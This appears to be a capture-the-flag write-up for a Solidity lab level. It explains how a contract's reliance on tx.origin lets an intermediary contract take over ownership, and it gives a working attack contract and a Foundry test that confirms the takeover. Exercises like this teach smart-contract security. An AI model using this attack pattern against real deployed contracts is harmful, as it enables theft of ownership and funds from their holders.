# Objective

- Claim ownership of the contract

# Proof of Concept

The contract relies on `tx.origin` to perform Authorization checks. A malicious
intermediate contract (e.g: phishing attack) can call `changeOwner()` and pass
the function checks.


**TelephoneAttack.sol**

```solidity
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}
```

```solidity
function testTelephoneHack() public {
    TelephoneAttack attackContract = new TelephoneAttack(levelAddress);
    emit log_named_address("tx.origin", tx.origin);
    emit log_named_address("msg.sender", attacker); // vm cheatcode set to attacker
    attackContract.attack();

    assertEq(telephoneContract.owner(), attacker);
}
```
